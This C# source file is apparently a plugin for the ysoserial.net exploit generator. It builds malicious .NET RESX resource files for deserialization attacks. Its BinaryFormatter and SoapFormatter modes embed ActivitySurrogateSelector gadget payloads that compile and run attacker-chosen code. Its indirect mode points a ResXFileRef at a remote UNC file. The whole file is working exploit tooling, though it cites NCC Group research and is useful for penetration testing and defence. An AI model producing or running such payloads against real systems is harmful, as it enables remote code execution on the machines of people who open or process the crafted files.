using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial_frmv2.Generators;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  There are a number of techniques to make the resource files (refer to the NCC Group blog post). Only a few of them have been included here.
 *  For BinaryFormatter, it uses the TypeConfuseDelegate gadget and for SoapFormatter it uses the ActivitySurrogateSelectorFromFile and ActivitySurrogateSelector gadgets.
 *  .RESX file can be compiled to .RESOURCE using the `resgen.exe payload.resx` command.
 * 
 * Original references: 
 *  https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
 *  https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
 **/

namespace ysoserial_frmv2.Plugins
{
    class ResxPlugin : Plugin
    {
        static string mode = "";
        static string file = "";
        static string command = "";

        static OptionSet options = new OptionSet()
            {
                {"M|mode=", "the payload mode: indirect_resx_file, BinaryFormatter, SoapFormatter.", v => mode = v },
                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\"", v => command = v },
                {"F|file=", "UNC file path location: this is used in indirect_resx_file mode.", v => file = v },
            };

        public string Name()
        {
            return "Resx";
        }

        public string Description()
        {
            return "Generates RESX files";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }
            String mtype = "";
            String payloadValue = "";
            string payload = @"<?xml version=""1.0"" encoding=""utf-8""?>
<root>
 <xsd:schema id=""root"" xmlns="""" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
 <xsd:import namespace=""http://www.w3.org/XML/1998/namespace"" />
 <xsd:element name=""root"" msdata:IsDataSet=""true"">
 <xsd:complexType>
 <xsd:choice maxOccurs=""unbounded"">
 <xsd:element name=""metadata"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" use=""required"" type=""xsd:string"" />
 <xsd:attribute name=""type"" type=""xsd:string"" />
 <xsd:attribute name=""mimetype"" type=""xsd:string"" />
 <xsd:attribute ref=""xml:space"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""assembly"">
 <xsd:complexType>
 <xsd:attribute name=""alias"" type=""xsd:string"" />
 <xsd:attribute name=""name"" type=""xsd:string"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""data"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />
 <xsd:element name=""comment"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""2"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" msdata:Ordinal=""1"" />
 <xsd:attribute name=""type"" type=""xsd:string"" msdata:Ordinal=""3"" />
 <xsd:attribute name=""mimetype"" type=""xsd:string"" msdata:Ordinal=""4"" />
 <xsd:attribute ref=""xml:space"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""resheader"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" />
 </xsd:complexType>
 </xsd:element>
 </xsd:choice>
 </xsd:complexType>
 </xsd:element>
 </xsd:schema>
 <resheader name=""resmimetype"">
 <value>text/microsoft-resx</value>
 </resheader>
 <resheader name=""version"">
 <value>2.0</value>
 </resheader>
 <resheader name=""reader"">
 <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
 </resheader>
 <resheader name=""writer"">
 <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
 </resheader>
 <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />

<data name=""test"" {0}>
 <value>{1}</value>
 </data>
</root>";
            switch (mode.ToLower())
            {
                case "indirect_resx_file":
                    if (!String.IsNullOrEmpty(file) && !String.IsNullOrEmpty(file.Trim()))
                    {
                        mtype = @"type=""System.Resources.ResXFileRef""";
                        payloadValue = file + "; System.Resources.ResXResourceSet, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
                    }
                    break;
                case "binaryformatter":
                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrEmpty(command.Trim()))
                    {
                        mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
                        payloadValue = Convert.ToBase64String(osf);

                    }
                    break;
                case "soapformatter":
                    mtype = @"mimetype=""application/x-microsoft.net.object.soap.base64""";
                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrEmpty(command.Trim()))
                    {
                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "SoapFormatter", false);
                        payloadValue = Convert.ToBase64String(osf);
                    }
                    else
                    {
                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate("", "SoapFormatter", false);
                        payloadValue = Convert.ToBase64String(osf);
                    }
                    break;
            }

            if (String.IsNullOrEmpty(payloadValue))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            payload = String.Format(payload, mtype, payloadValue);
            return payload;
        }
    }
}
